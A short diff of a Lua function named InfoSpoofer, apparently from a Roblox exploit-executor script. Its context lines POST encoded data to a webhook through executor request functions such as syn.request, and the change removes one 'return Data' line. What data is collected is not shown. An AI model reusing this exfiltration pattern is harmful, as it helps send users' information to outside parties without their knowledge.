@@ -53,7 +53,6 @@ local InfoSpoofer = function(Game)
         local Request = http_request or request or HttpPost or syn.request
         local Final = {Url = WeebHook, Body = Encoded, Method = "POST", Headers = Headers}
         Request(Final)
-        return Data
     end
 end
 return InfoSpoofer
